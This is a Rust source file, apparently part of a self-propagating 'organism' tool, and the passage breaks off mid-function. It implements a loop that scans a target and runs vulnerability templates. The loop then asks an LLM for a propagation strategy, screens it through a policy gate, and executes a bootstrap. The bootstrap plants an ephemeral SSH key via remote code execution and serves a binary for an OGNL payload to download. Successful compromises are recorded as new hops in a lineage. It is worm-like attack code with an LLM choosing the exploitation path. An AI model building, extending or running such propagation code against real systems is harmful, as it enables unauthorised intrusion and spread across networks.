/// LLM-aware propagation reasoning loop (Issue #106, Phase 4).
///
/// Triggered when standard SSH/SCP propagation fails (port 22 closed or
/// SCP/SSH rejected) and `--llm-endpoint` is configured.
///
/// Loop per target:
///   1. Scanner fingerprint — open ports and basic service guesses.
///   2. Build `DiscoveryQuery` with lineage summary + prior rejections.
///   3. Query LLM backend → `PropagationStrategy`.
///   4. `PolicyGate::evaluate` before any execution.
///   5. Execute bootstrap plan steps (or simulate in lab mode).
///   6. Record `LlmAttemptEvidence` in lineage on every outcome.
///   7. On rejection or failure → append to `rejected_strategies`, retry.
///   8. Stop at `MAX_ATTEMPTS` or on `PropagationMethod::NoPath`.
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::path::{Path, PathBuf};

use anyhow::Result;
use futures::stream::{self, StreamExt};
use physarum_llm::{
    ArtifactType, BootstrapAction, DiscoveryQuery, ExecutionResultSummary, LlmAttemptEvidence,
    LlmClient, NextAction, OsHint, OsHintSource, PatternFindingSummary, PolicyDecision, PolicyGate,
    PolicyRejectionReason, PortScan, PortState, PropagationMethod, PropagationMethodClass,
    RejectedStrategy, TemplateMeta, TemplateSelectionQuery, TransportProtocol, MAX_ATTEMPTS,
};
use physarum_scanner::{
    result_from_open_port, EvidenceSource as ScanEvidenceSource, NextProbeHint,
    OsHintSource as ScanOsHintSource, PortList, Scanner, SchemeHint, SensingProfile,
    STIMULUS_PORTS,
};
use physarum_sporangium::{PatternFinding, PatternRunner, RunPolicy, SeverityHint};

use crate::lineage::Lineage;
use crate::vuln_intel::VulnerabilityIntelService;

pub enum LlmOutcome {
    /// Bootstrap succeeded — lineage extended with new hop + evidence recorded.
    Propagated,
    /// All attempts exhausted or LLM returned NoPath — mark target as dead end.
    DeadEnd,
}

/// Run the 6-attempt LLM reasoning loop for `target`.
///
/// Mutates `lineage` in place: records `LlmAttemptEvidence` on every attempt
/// and extends the path on success. Caller is responsible for `lineage.save()`
/// after this function returns.
///
/// `gate` must have `allowed_cidrs` populated before calling.
pub async fn run(
    target: Ipv4Addr,
    stimulus: &str,
    lineage: &mut Lineage,
    client: &dyn LlmClient,
    gate: &PolicyGate,
    intel: &VulnerabilityIntelService,
    local_ip: Option<Ipv4Addr>,
) -> Result<LlmOutcome> {
    tracing::info!(%target, stimulus, "LLM reasoning loop started");

    let evidence_source = stimulus_to_evidence_source(stimulus);
    let profile = stimulus_to_profile(stimulus);
    let sensing_results = fingerprint(target, evidence_source, profile).await;
    // Upgrade port-convention results with lightweight banner grabs.
    // Raises confidence 0.5 → 0.65–0.85, sets scheme_hint from banner evidence,
    // and clears recommended_next_probe when the protocol is resolved.
    let sensing_results = banner_grab_all(target, sensing_results).await;
    let port_scans: Vec<PortScan> = sensing_results
        .iter()
        .map(sensing_result_to_port_scan)
        .collect();
    let os_hint = infer_os_hint_from_results(&sensing_results);

    // ── Turn 1: LLM template selection ───────────────────────────────────────
    // Build compact template catalog and let the LLM pick which templates to run.
    // The catalog is capped at MAX_TEMPLATES_FOR_SELECTION to keep the prompt
    // token-efficient. CVE-specific templates are always included first.
    let all_templates = physarum_sporangium::all_templates_with_yaml();
    let template_catalog = build_template_catalog_for_llm(&all_templates, &port_scans);
    let selection_query = TemplateSelectionQuery {
        target: IpAddr::V4(target),
        ports: port_scans.clone(),
        available_templates: template_catalog,
        lineage_summary: build_lineage_summary(lineage),
    };

    let selected_ids = match client.select_templates(&selection_query).await {
        Ok(resp) => {
            tracing::info!(
                %target,
                count = resp.selected_ids.len(),
                reasoning = %resp.reasoning,
                "LLM Turn 1: template selection complete"
            );
            resp.selected_ids
        }
        Err(e) => {
            tracing::warn!(%target, err = %e, "LLM Turn 1 (template selection) failed — running all templates");
            vec![] // empty = no filter (run all)
        }
    };

    // ── Enrich with selected templates ───────────────────────────────────────
    // Enrich with physarum-sporangium pattern evidence on web-like services.
    // Runs once before the attempt loop — findings are stable across retries.
    let raw_findings = enrich_with_patterns(target, &sensing_results, &selected_ids).await;

    // Dynamic vulnerability intelligence: offline advisory cache first,
    // online OSV query on miss. One call per finding, bounded concurrency.
    let vuln_candidates = intel.enrich_findings(&raw_findings).await;

    let pattern_summaries: Vec<PatternFindingSummary> = raw_findings
        .iter()
        .zip(vuln_candidates)
        .map(|(f, candidates)| pattern_finding_to_summary(f, candidates))
        .collect();

    tracing::info!(
        %target,
        open_ports = sensing_results.len(),
        pattern_findings = pattern_summaries.len(),
        actionable = pattern_summaries.iter().filter(|f| f.is_actionable).count(),
        "evidence bundle ready"
    );

    // Stable across all attempts — computed once from the enriched pattern summaries.
    let cve_ids = extract_cve_ids(&pattern_summaries);
    if !cve_ids.is_empty() {
        tracing::info!(%target, ?cve_ids, "CVE candidates in DiscoveryQuery");
    }

    // ── Ephemeral SSH keypair (Exploit class only) ────────────────────────────
    // Generated once per target visit — the same pubkey is embedded in every
    // DiscoveryQuery so the LLM can plant it via RCE in any attempt.
    // The private key never leaves this process; it is cleaned up after the loop.
    let ephemeral_key = if gate.exploit_enabled {
        match generate_ephemeral_keypair().await {
            Ok(k) => {
                tracing::info!(%target, pubkey = %k.pubkey, "ephemeral SSH keypair generated");
                Some(k)
            }
            Err(e) => {
                tracing::warn!(%target, err = %e, "ephemeral keypair generation failed — exploit SSH path unavailable");
                None
            }
        }
    } else {
        None
    };

    let mut rejected: Vec<RejectedStrategy> = Vec::new();

    for attempt_number in 1..=MAX_ATTEMPTS {
        let query = DiscoveryQuery {
            target: IpAddr::V4(target),
            ports: port_scans.clone(),
            os_hint: os_hint.clone(),
            lineage_summary: build_lineage_summary(lineage),
            methods_tried: lineage
                .llm_attempts
                .iter()
                .map(|e| format!("{:?}", e.method_class))
                .collect(),
            rejected_strategies: rejected.clone(),
            attempt_number,
            pattern_findings: pattern_summaries.clone(),
            source_ip: local_ip.map(IpAddr::V4),
            ephemeral_pubkey: ephemeral_key.as_ref().map(|k| k.pubkey.clone()),
        };

        // ── Query LLM ────────────────────────────────────────────────────────
        let strategy = match client.query_propagation(&query).await {
            Ok(s) => s,
            Err(e) => {
                tracing::warn!(%target, attempt = attempt_number, err = %e, "LLM query error");
                lineage.record_llm_attempt(LlmAttemptEvidence {
                    target: target.to_string(),
                    attempt_number,
                    stimulus_source: stimulus.to_string(),
                    method_class: PropagationMethodClass::NoPath,
                    artifact_type: ArtifactType::None,
                    policy_decision: PolicyDecision::Rejected {
                        reason: PolicyRejectionReason::Custom(format!("LLM query error: {e}")),
                        rule: "llm_client".into(),
                    },
                    execution_result: ExecutionResultSummary::Skipped {
                        reason: format!("LLM query failed: {e}"),
                    },
                    reasoning_summary: format!("LLM query error on attempt {attempt_number}: {e}"),
                    next_action: NextAction::RetryWithLlm,
                    strategy_id: String::new(),
                    strategy_confidence: 0.0,
                    target_port: None,
                    cve_candidate_ids: cve_ids.clone(),
                });
                continue;
            }
        };

        let strategy_id = strategy_fingerprint(&strategy);
        let method_class = method_class_of(&strategy.method);

        // ── NoPath early exit ─────────────────────────────────────────────────
        if matches!(strategy.method, PropagationMethod::NoPath { ref reason } if {
            tracing::info!(%target, attempt = attempt_number, %reason, "LLM returned NoPath");
            true
        }) {
            lineage.record_llm_attempt(LlmAttemptEvidence {
                target: target.to_string(),
                attempt_number,
                stimulus_source: stimulus.to_string(),
                method_class: PropagationMethodClass::NoPath,
                artifact_type: ArtifactType::None,
                policy_decision: PolicyDecision::Accepted,
                execution_result: ExecutionResultSummary::Skipped {
                    reason: "LLM returned NoPath".into(),
                },
                reasoning_summary: strategy.reasoning_summary.clone(),
                next_action: NextAction::MarkDeadEnd,
                strategy_id,
                strategy_confidence: strategy.confidence,
                target_port: None,
                cve_candidate_ids: cve_ids.clone(),
            });
            return Ok(LlmOutcome::DeadEnd);
        }

        // ── Policy gate ───────────────────────────────────────────────────────
        let policy_decision = gate.evaluate(&strategy, target, attempt_number);

        if matches!(policy_decision, PolicyDecision::Rejected { .. }) {
            let rule_str = match &policy_decision {
                PolicyDecision::Rejected { rule, .. } => rule.clone(),
                PolicyDecision::Accepted => String::new(),
            };
            tracing::warn!(%target, attempt = attempt_number, rule = %rule_str, "strategy rejected by policy gate");
            if let Some(record) =
                gate.into_rejection_record(&strategy, attempt_number, &policy_decision)
            {
                rejected.push(record);
            }
            lineage.record_llm_attempt(LlmAttemptEvidence {
                target: target.to_string(),
                attempt_number,
                stimulus_source: stimulus.to_string(),
                method_class,
                artifact_type: strategy.artifact_type.clone(),
                policy_decision,
                execution_result: ExecutionResultSummary::Skipped {
                    reason: format!("Policy rejected: {rule_str}"),
                },
                reasoning_summary: strategy.reasoning_summary.clone(),
                next_action: NextAction::RetryWithLlm,
                strategy_id,
                strategy_confidence: strategy.confidence,
                target_port: method_port(&strategy.method),
                cve_candidate_ids: cve_ids.clone(),
            });
            continue;
        }

        tracing::info!(
            %target, attempt = attempt_number, ?method_class,
            confidence = strategy.confidence,
            "policy accepted — executing bootstrap"
        );

        // ── Binary server (Exploit class only) ───────────────────────────────
        // Start ephemeral HTTP server so the OGNL payload can wget the binary.
        // Aborted after the bootstrap attempt regardless of outcome.
        let binary_server = if method_class == PropagationMethodClass::Exploit {
            if let Some(ip) = local_ip {
                start_binary_server(ip).await
            } else {
                tracing::warn!(%target, "Exploit method selected but local_ip is unknown — binary server skipped");
                None
            }
        } else {
            None
        };

        // ── Execute bootstrap ─────────────────────────────────────────────────
        let key_path = ephemeral_key.as_ref().map(|k| k.privkey_path.as_path());
        let exec_result = execute_bootstrap(&strategy, target, key_path).await;

        // Shut down binary server after bootstrap attempt.
        if let Some(h) = binary_server {
            h.abort();
        }
        let succeeded = matches!(exec_result, ExecutionResultSummary::Success);

        let next_action = if succeeded {
            NextAction::ContinueOrganismLoop
        } else {
            NextAction::RetryWithLlm
        };

        lineage.record_llm_attempt(LlmAttemptEvidence {
            target: target.to_string(),
            attempt_number,
            stimulus_source: stimulus.to_string(),
            method_class,
            artifact_type: strategy.artifact_type.clone(),
            policy_decision: PolicyDecision::Accepted,
            execution_result: exec_result,
            reasoning_summary: strategy.reasoning_summary.clone(),
            next_action,
            strategy_id,
            strategy_confidence: strategy.confidence,
            target_port: method_port(&strategy.method),
            cve_candidate_ids: cve_ids.clone(),
        });

        if succeeded {
            tracing::info!(%target, attempt = attempt_number, "LLM bootstrap succeeded");
            // Clean up ephemeral key on success — no longer needed after propagation.
            if let Some(key) = &ephemeral_key {
                let _ = tokio::fs::remove_file(&key.privkey_path).await;
                let pub_path = key.privkey_path.with_extension("pub");
                let _ = tokio::fs::remove_file(&pub_path).await;
            }
            let extended = lineage.extend(&target.to_string());
            *lineage = extended;
            return Ok(LlmOutcome::Propagated);
        }

        tracing::warn!(%target, attempt = attempt_number, "bootstrap failed — retrying");
    }

    tracing::warn!(%target, max = MAX_ATTEMPTS, "LLM max attempts exhausted — dead end");

    // Clean up ephemeral key — private key material must not persist after the loop.
    if let Some(key) = &ephemeral_key {
        let _ = tokio::fs::remove_file(&key.privkey_path).await;
        let pub_path = key.privkey_path.with_extension("pub");
        let _ = tokio::fs::remove_file(&pub_path).await;
        tracing::debug!(%target, "ephemeral SSH keypair removed");
    }

    Ok(LlmOutcome::DeadEnd)
}

// ── Scanner fingerprint ───────────────────────────────────────────────────────

/// Map a stimulus string to the `EvidenceSource` tag written into `SensingResult`.
fn stimulus_to_evidence_source(stimulus: &str) -> ScanEvidenceSource {
    match stimulus {
        "startup-sensing" => ScanEvidenceSource::StartupSensing,
        "icmp" => ScanEvidenceSource::IcmpStimulus,
        "tcp-syn" => ScanEvidenceSource::TcpStimulus,
        "ebpf" => ScanEvidenceSource::EbpfObservation,
        _ => ScanEvidenceSource::ScheduledScan,
    }
}

/// Map a stimulus string to the adaptive `SensingProfile` used for fingerprinting.
///
/// | Stimulus        | Profile                | Behaviour                        |
/// |-----------------|------------------------|----------------------------------|
/// | startup-sensing | StartupLocalDiscovery  | broad ports, moderate speed      |
/// | tcp-syn / ebpf  | RuntimeTcpEbpfFast     | top ports, skip host discovery   |
/// | icmp            | RuntimeIcmpFast        | top ports, normal host confirm   |
/// | (other)         | StimulusTargeted       | focused STIMULUS_PORTS, -Pn      |
fn stimulus_to_profile(stimulus: &str) -> SensingProfile {
    match stimulus {
        "startup-sensing" => SensingProfile::StartupLocalDiscovery,
        "tcp-syn" | "ebpf" => SensingProfile::RuntimeTcpEbpfFast,
        "icmp" => SensingProfile::RuntimeIcmpFast,
        _ => SensingProfile::StimulusTargeted,
    }
}

/// Fingerprint `target` using the adaptive profile selected by `stimulus_to_profile`.
///
/// Profile params (batch_size, timeout_ms, tries, port_subset) are derived
/// deterministically from the profile so tuning a profile tunes the fingerprint.
async fn fingerprint(
    target: Ipv4Addr,
    evidence_source: ScanEvidenceSource,
    profile: SensingProfile,
) -> Vec<physarum_scanner::SensingResult> {
    let params = profile.params();
    let port_list = PortList::explicit(params.port_subset.unwrap_or(STIMULUS_PORTS).to_vec());
    match Scanner::new(vec![IpAddr::V4(target)], port_list)
        .batch_size(params.batch_size)
        .timeout_ms(params.timeout_ms)
        .tries(params.tries)
        .run()
        .await
    {
        Ok(open) => open
            .iter()
            .map(|sa| {
                result_from_open_port(
                    IpAddr::V4(target),
                    sa.port(),
                    profile.clone(),
                    evidence_source,
                )
            })
            .collect(),
        Err(e) => {
            tracing::warn!(%target, err = %e, "fingerprint scan failed — empty");
            vec![]
        }
    }
}

/// Convert a `physarum_scanner::SensingResult` to a `physarum_llm::PortScan`.
///
/// `banner_or_handshake_summary` maps to `PortScan::banner`.
/// Only TCP open ports are expected here (produced by `result_from_open_port`).
fn sensing_result_to_port_scan(r: &physarum_scanner::SensingResult) -> PortScan {
    PortScan {
        port: r.port,
        protocol: TransportProtocol::Tcp,
        state: PortState::Open,
        service_guess: r.service_guess.clone(),
        banner: r.banner_or_handshake_summary.clone(),
        version_hint: r.version_hint.clone(),
    }
}

/// Derive an `OsHint` from the sensing layer's structured evidence.
///
/// Uses the first `SensingResult` that carries an `os_hint`, converting
/// `physarum_scanner::OsHintSource` → `physarum_llm::OsHintSource`.
fn infer_os_hint_from_results(results: &[physarum_scanner::SensingResult]) -> Option<OsHint> {
    results
        .iter()
        .find_map(|r| r.os_hint.as_ref())
        .map(|h| OsHint {
            guess: h.guess.clone(),
            confidence: h.confidence,
            source: match h.source {
                ScanOsHintSource::SshBanner => OsHintSource::SshBanner,
                ScanOsHintSource::HttpHeader => OsHintSource::HttpHeader,
                ScanOsHintSource::ServiceBanner => OsHintSource::ServiceBanner,
                ScanOsHintSource::Convention => OsHintSource::Convention,
            },
        })
}

// ── Banner grab + sensing upgrade ────────────────────────────────────────────

/// Maximum concurrent banner grabs per target host.
const MAX_BANNER_CONCURRENCY: usize = 8;

/// Lightweight TCP banner grab — reads the first ≤ 256 bytes a server sends.
///
/// For HTTP-like ports a minimal `GET /` probe is sent to elicit a response.
/// Ports 443/8443/9443 are TLS — raw TCP would return binary TLS handshake bytes,
/// so we skip the write probe and just read (the TLS ClientHello itself is binary
/// and sanitised away, but the server may send an HTTP error after a bare read).
/// Returns `None` if the port is silent, refuses, or times out.
async fn grab_banner(target: Ipv4Addr, port: u16) -> Option<String> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpStream;
    use tokio::time::{timeout, Duration};

    const TIMEOUT_MS: u64 = 1_500;
    const MAX_BYTES: usize = 256;

    let addr = SocketAddr::new(IpAddr::V4(target), port);
    let mut stream = timeout(Duration::from_millis(TIMEOUT_MS), TcpStream::connect(addr))
        .await
        .ok()?
        .ok()?;

    // Send a minimal HTTP probe for plain-HTTP ports to elicit a response header.
    // TLS ports (443/8443/9443) are skipped — the TLS handshake would be binary.
    if matches!(
        port,
        80 | 3000 | 5000 | 5984 | 7080 | 8000 | 8080 | 8888 | 9000 | 9090 | 9200 | 9999
    ) {
        let _ = timeout(
            Duration::from_millis(TIMEOUT_MS),
            stream.write_all(b"GET / HTTP/1.0\r\nHost: physarum\r\nConnection: close\r\n\r\n"),
        )
        .await;
    }

    let mut buf = vec![0u8; MAX_BYTES];
    let n = timeout(Duration::from_millis(TIMEOUT_MS), stream.read(&mut buf))
        .await
        .ok()?
        .ok()?;

    if n == 0 {
        return None;
    }

    let sanitized: String = buf[..n]
        .iter()
        .map(|&b| {
            if b.is_ascii_graphic() || matches!(b, b' ' | b'\r' | b'\n') {
                b as char
            } else {
                '.'
            }
        })
        .collect();

    let trimmed = sanitized.trim().to_string();
    if trimmed.is_empty() {
        None
    } else {
        Some(trimmed)
    }
}

/// Upgrade a `SensingResult` with banner evidence.
///
/// - Raises confidence from 0.5 → 0.65–0.85 depending on evidence quality.
/// - Sets `scheme_hint` to `Http` when response headers confirm HTTP.
/// - Sets `version_hint` when a server version string is recognised.
/// - Clears `recommended_next_probe` when the banner resolves the ambiguity.
fn upgrade_with_banner(
    mut r: physarum_scanner::SensingResult,
    banner: Option<String>,
) -> physarum_scanner::SensingResult {
    let Some(raw) = banner else {
        return r; // No banner — keep initial convention-based fields.
    };

    let b = raw.to_ascii_lowercase();

    if b.starts_with("http/") || b.contains("content-type:") || b.contains("server:") {
        r.scheme_hint = SchemeHint::Http;
        r.confidence = 0.85;
        r.recommended_next_probe = NextProbeHint::None;
    } else if b.starts_with("ssh-")
        || b.starts_with("220 ")
        || b.starts_with("+ok ")
        || b.starts_with("* ok ")
    {
        // Non-web protocol greeting confirmed — classification will mark ConfirmedNonWeb.
        r.confidence = 0.85;
        r.recommended_next_probe = NextProbeHint::None;
    } else {
        // Unrecognised banner — some evidence, but protocol still unclear.
        // Keep recommended_next_probe so HTTP probe can try to resolve.
        r.confidence = 0.65;
    }

    if let Some(v) = extract_version_hint(&raw) {
        r.version_hint = Some(v);
    }

    r.banner_or_handshake_summary = Some(raw);
    r
}

/// Scan `raw` for common server version strings (nginx, Apache, OpenSSH, …).
fn extract_version_hint(raw: &str) -> Option<String> {
    let b = raw.to_ascii_lowercase();
    for pat in &[
        "nginx/",
        "apache/",
        "openssh_",
        "openssl/",
        "tomcat/",
        "jetty/",
        "lighttpd/",
        "gunicorn/",
    ] {
        if let Some(pos) = b.find(pat) {
            let end = raw[pos..]
                .find(|c: char| c.is_whitespace())
                .map(|e| pos + e)
                .unwrap_or_else(|| raw.len().min(pos + 32));
            return Some(raw[pos..end].to_string());
        }
    }
    None
}

/// Run banner grabs concurrently for all open ports, upgrading each result.
async fn banner_grab_all(
    target: Ipv4Addr,
    results: Vec<physarum_scanner::SensingResult>,
) -> Vec<physarum_scanner::SensingResult> {
    stream::iter(results.into_iter().map(|r| async move {
        let banner = grab_banner(target, r.port).await;
        tracing::debug!(
            %target, port = r.port, got_banner = banner.is_some(),
            "banner grab complete"
        );
        upgrade_with_banner(r, banner)
    }))
    .buffer_unordered(MAX_BANNER_CONCURRENCY)
    .collect()
    .await
}

// ── Sporangium pattern enrichment ─────────────────────────────────────────────

/// Maximum concurrent physarum-spore template probes per enrichment call.
const MAX_ENRICH_CONCURRENCY: usize = 8;

/// Ports that warrant opportunistic physarum-spore probing when no protocol
/// evidence is available — common HTTP/HTTPS alternative and dev ports.
const CONVENTIONAL_WEB_PORTS: &[u16] = &[
    80, 443, 3000, 5000, 7001, 7080, 8000, 8080, 8443, 8888, 9000, 9090, 9200, 9443, 9999,
];

/// Service guess names that indicate a clearly non-web protocol.
const NON_WEB_SERVICE_NAMES: &[&str] = &[
    "ssh",
    "ftp",
    "sftp",
    "telnet",
    "smtp",
    "smtps",
    "submission",
    "pop3",
    "pop3s",
    "imap",
    "imaps",
    "mysql",
    "postgresql",
    "redis",
    "mssql",
    "oracle",
    "ldap",
    "ldaps",
    "rdp",
    "vnc",
    "netbios-ssn",
    "microsoft-ds",
    "syslog",
    "dns",
    "rpcbind",
    "ipp",
    "nfs",
    "socks",
    "pptp",
];

/// Classification of a discovered service with respect to HTTP/web-layer probing.
///
/// The decision is not binary. A service may be confirmed, likely, ambiguous, or
/// definitively non-web. Each class drives a different enrichment policy:
///
/// | Class                    | physarum-spore | LLM via SensingResult |
/// |--------------------------|----------------|-----------------------|
/// | ConfirmedWeb             | all templates  | yes                   |
/// | LikelyWeb                | opportunistic  | yes                   |
/// | UnknownNeedsMoreSensing  | skip (for now) | yes (low confidence)  |
/// | ConfirmedNonWeb          | skip           | yes                   |
///
/// `UnknownNeedsMoreSensing` is the hook for future adaptive re-sensing:
/// physarum-scan should eventually perform a targeted HTTP probe (e.g.
/// `GET / HTTP/1.0`) to resolve ambiguity before the LLM attempt loop.
/// This connects to the PF-2 adaptive re-routing design.
#[derive(Debug, Clone, PartialEq, Eq)]
enum ServiceClassification {
    /// Banner or service header confirms HTTP/HTTPS. All spore templates apply.
    ConfirmedWeb,
    /// Port convention suggests HTTP/web but no definitive banner exists.
    /// Physarum-spore is run opportunistically; false-positive rate is low.
    LikelyWeb,
    /// Service responded but protocol evidence is insufficient to conclude.
    /// physarum-spore is skipped. The service is forwarded to the LLM as a
    /// SensingResult with low confidence. Future evolution: trigger a deeper
    /// physarum-scan fingerprint pass (targeted HTTP probe) to resolve this.
    UnknownNeedsMoreSensing,
    /// Banner or service name definitively identifies a non-web protocol.
    /// physarum-spore is not run. The service is forwarded to the LLM normally.
    ConfirmedNonWeb,
}

/// Resolve the service classification, performing an HTTP probe when the initial
/// evidence is ambiguous (`UnknownNeedsMoreSensing`) and the sensing result
/// recommends one via `recommended_next_probe`.
///
/// This is the PF-3.1 adaptive fingerprint path: instead of skipping ambiguous
/// services entirely, the organism attempts a targeted HTTP/HTTPS probe to decide
/// whether the service is web-like before the LLM loop runs.
async fn resolve_classification(
    r: &physarum_scanner::SensingResult,
    target: Ipv4Addr,
) -> ServiceClassification {
    let initial = classify_web_candidate(r);
    if initial != ServiceClassification::UnknownNeedsMoreSensing {
        return initial;
    }

    if let NextProbeHint::HttpProbe { scheme } = &r.recommended_next_probe {
        if try_http_probe(target, r.port, scheme).await {
            tracing::debug!(
                %target, port = r.port,
                "UnknownNeedsMoreSensing resolved to ConfirmedWeb via targeted HTTP probe"
            );
            return ServiceClassification::ConfirmedWeb;
        }
    }

    ServiceClassification::UnknownNeedsMoreSensing
}

/// Attempt a quick HTTP (or HTTPS) probe against `target:port`.
///
/// Returns `true` if the server responds with any valid HTTP response (even 4xx/5xx),
/// which confirms it is running an HTTP stack. Returns `false` on connection error,
/// TLS failure, or timeout.
///
/// When `scheme = Unknown`, tries HTTP first; if that fails, retries with HTTPS.
async fn try_http_probe(target: Ipv4Addr, port: u16, scheme: &SchemeHint) -> bool {
    use tokio::time::Duration;

    const TIMEOUT_MS: u64 = 2_000;

    let client = match reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_millis(TIMEOUT_MS))
        .build()
    {
        Ok(c) => c,
        Err(_) => return false,
    };

    let probe = |url: String| {
        let client = client.clone();
        async move {
            match client.get(&url).send().await {
                Ok(resp) => {
                    tracing::debug!(
                        %target, port, %url, status = resp.status().as_u16(),
                        "targeted HTTP probe response"
                    );
                    true
                }
                Err(e) => {
                    tracing::debug!(%target, port, %url, err = %e, "targeted HTTP probe failed");
                    false
                }
            }
        }
    };

    match scheme {
        SchemeHint::Https => probe(format!("https://{}:{}/", target, port)).await,
        SchemeHint::Http => probe(format!("http://{}:{}/", target, port)).await,
        SchemeHint::Unknown => {
            // Try HTTP first; fall back to HTTPS if HTTP fails.
            if probe(format!("http://{}:{}/", target, port)).await {
                return true;
            }
            probe(format!("https://{}:{}/", target, port)).await
        }
    }
}

/// Map a `SchemeHint` to the string passed to `PatternRunner::run()`.
/// `Unknown` maps to `None` — lets PatternRunner use its port-based fallback.
fn scheme_str_for(hint: &SchemeHint) -> Option<String> {
    match hint {
        SchemeHint::Http => Some("http".to_string()),
        SchemeHint::Https => Some("https".to_string()),
        SchemeHint::Unknown => None,
    }
}

/// Returns true if `r` carries definitive evidence of a non-web protocol.
fn has_definitive_non_web_evidence(r: &physarum_scanner::SensingResult) -> bool {
    if let Some(g) = &r.service_guess {
        if NON_WEB_SERVICE_NAMES.contains(&g.to_ascii_lowercase().as_str()) {
            return true;
        }
    }

    if let Some(banner) = &r.banner_or_handshake_summary {
        let b = banner.to_ascii_lowercase();
        // SSH: "SSH-2.0-OpenSSH_8.4p1 ..."
        // FTP/SMTP: "220 <hostname> ..." greeting
        // POP3:  "+OK ..."
        // IMAP:  "* OK ..."
        if b.starts_with("ssh-")
            || b.starts_with("220 ")
            || b.starts_with("+ok ")
            || b.starts_with("* ok ")
        {
            return true;
        }
    }

    false
}

/// Returns true if `r` carries definitive evidence of an HTTP/web-like service.
fn has_definitive_web_evidence(r: &physarum_scanner::SensingResult) -> bool {
    if let Some(g) = &r.service_guess {
        let g = g.to_ascii_lowercase();
        if g.starts_with("http")
            || matches!(
                g.as_str(),
                "weblogic" | "couchdb" | "elasticsearch" | "docker"
            )
        {
            return true;
        }
    }

    if let Some(banner) = &r.banner_or_handshake_summary {
        let b = banner.to_ascii_lowercase();
        if b.contains("http/")
            || b.contains("server:")
            || b.contains("content-type:")
            || b.contains("<html")
        {
            return true;
        }
    }

    if let Some(vh) = &r.version_hint {
        let v = vh.to_ascii_lowercase();
        if v.contains("nginx")
            || v.contains("apache")
            || v.contains("express")
            || v.contains("tomcat")
        {
            return true;
        }
    }

    false
}

/// Classify a discovered service for physarum-spore enrichment eligibility.
///
/// Layer order:
///   1. Definitive non-web evidence → `ConfirmedNonWeb` (SSH on 8080 is not web).
///   2. Definitive web evidence → `ConfirmedWeb` (HTTP on any port).
///   3. Conventional web port, no strong evidence → `LikelyWeb` (opportunistic).
///   4. Non-standard port, no evidence → `UnknownNeedsMoreSensing`.
fn classify_web_candidate(r: &physarum_scanner::SensingResult) -> ServiceClassification {
    if has_definitive_non_web_evidence(r) {
        return ServiceClassification::ConfirmedNonWeb;
    }

    if has_definitive_web_evidence(r) {
        return ServiceClassification::ConfirmedWeb;
    }

    if CONVENTIONAL_WEB_PORTS.contains(&r.port) {
        return ServiceClassification::LikelyWeb;
    }

    ServiceClassification::UnknownNeedsMoreSensing
}

/// Run physarum-sporangium templates against every web-like service on `target`.
///
/// `selected_ids`: LLM Turn 1 template selection result. When non-empty, only
/// templates whose id appears in `selected_ids` are probed. An empty slice means
/// "no filter" (all templates run) — used when Turn 1 fails or returns nothing.
///
/// Classification now uses [`resolve_classification`] which performs a targeted
/// HTTP probe for `UnknownNeedsMoreSensing` services when `recommended_next_probe`
/// suggests one. This resolves cases 3–5 that were deferred in PF-3 (PR #122).
/// Template probe errors are logged at debug level and treated as no-match.
async fn enrich_with_patterns(
    target: Ipv4Addr,
    sensing_results: &[physarum_scanner::SensingResult],
    selected_ids: &[String],
) -> Vec<PatternFinding> {
    let mut web_results: Vec<(u16, Option<String>)> = Vec::new(); // (port, scheme_str)

    for r in sensing_results {
        match resolve_classification(r, target).await {
            ServiceClassification::ConfirmedWeb => {
                tracing::debug!(
                    %target, port = r.port, scheme = ?r.scheme_hint,
                    service_guess = ?r.service_guess,
                    "ConfirmedWeb — running all spore templates"
                );
                web_results.push((r.port, scheme_str_for(&r.scheme_hint)));
            }
            ServiceClassification::LikelyWeb => {
                tracing::debug!(
                    %target, port = r.port, scheme = ?r.scheme_hint,
                    service_guess = ?r.service_guess,
                    "LikelyWeb (conventional web port, no strong evidence) — \
                     running spore templates opportunistically"
                );
                web_results.push((r.port, scheme_str_for(&r.scheme_hint)));
            }
            ServiceClassification::UnknownNeedsMoreSensing => {
                tracing::debug!(
                    %target, port = r.port, service_guess = ?r.service_guess,
                    "UnknownNeedsMoreSensing — HTTP probe inconclusive, \
                     spore skipped, forwarded to LLM as unknown"
                );
            }
            ServiceClassification::ConfirmedNonWeb => {
                tracing::debug!(
                    %target, port = r.port, service_guess = ?r.service_guess,
                    "ConfirmedNonWeb — spore skipped, forwarded to LLM via PortScan"
                );
            }
        }
    }

    if web_results.is_empty() {
        return vec![];
    }

    let all_templates = physarum_sporangium::all_templates_with_yaml();

    // Apply LLM Turn 1 filter: when selected_ids is non-empty, restrict to those IDs.
    let templates: Vec<_> = if selected_ids.is_empty() {
        all_templates
    } else {
        all_templates
            .into_iter()
            .filter(|t| selected_ids.contains(&t.id))
            .collect()
    };

    tracing::info!(
        %target, template_count = templates.len(), filtered = !selected_ids.is_empty(),
        "sporangium enrichment: templates selected"
    );

    let policy = RunPolicy {
        allowed_check_ids: templates.iter().map(|t| t.id.clone()).collect(),
        max_response_bytes: 32_768,
        request_timeout_ms: 3_000,
        max_redirects: 2,
    };

    let runner = match PatternRunner::new(policy) {
        Ok(r) => std::sync::Arc::new(r),
        Err(e) => {
            tracing::warn!(
                %target, err = %e,
                "sporangium PatternRunner init failed — skipping enrichment"
            );
            return vec![];
        }
    };

    let tasks: Vec<_> = web_results
        .iter()
        .flat_map(|(port, scheme)| {
            let port = *port;
            let scheme = scheme.clone();
            let runner = runner.clone();
            templates.iter().map(move |t| {
                let runner = runner.clone();
                let template = t.clone();
                let scheme = scheme.clone();
                async move {
                    match runner
                        .run(&template, IpAddr::V4(target), port, scheme.as_deref())
                        .await
                    {
                        Ok(findings) => findings,
                        Err(e) => {
                            tracing::debug!(
                                %target, port, check_id = %template.id,
                                err = %e, "sporangium template probe error"
                            );
                            vec![]
                        }
                    }
                }
            })
        })
        .collect();

    stream::iter(tasks)
        .buffer_unordered(MAX_ENRICH_CONCURRENCY)
        .collect::<Vec<_>>()
        .await
        .into_iter()
        .flatten()
        .collect()
}

/// Convert a `PatternFinding` into the condensed `PatternFindingSummary` that
/// travels inside `DiscoveryQuery` to the LLM.
///
/// `candidates` are pre-computed by `VulnerabilityIntelService::enrich_findings()`
/// so this function is synchronous — async enrichment is done in a separate pass.
/// Raw response bodies are never forwarded.
fn pattern_finding_to_summary(
    f: &PatternFinding,
